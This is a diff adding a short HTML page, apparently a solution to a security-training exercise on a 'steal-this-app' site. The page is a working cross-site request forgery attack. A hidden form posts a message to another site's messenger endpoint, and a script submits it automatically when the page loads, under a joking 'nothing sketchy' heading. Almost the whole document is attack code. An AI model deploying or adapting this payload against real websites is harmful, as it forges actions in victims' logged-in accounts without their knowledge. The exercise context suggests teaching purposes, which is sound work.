@@ -1,0 +1,11 @@
+<h1>Definitely nothing sketchy going on here!</h1>
+<iframe src="display: none" name='target-iframe'></iframe>
+
+<form id="target-form" action="http://steal-this-app-horizons.herokuapp.com/exercise2/messenger" method="post" style="display: none">
+  <input type="hidden" name="to" value="shree2">
+  <input type="hidden" name="body" value="Asuh">
+</form>
+
+<script>
+  $('#target-form').submit()
+</script>
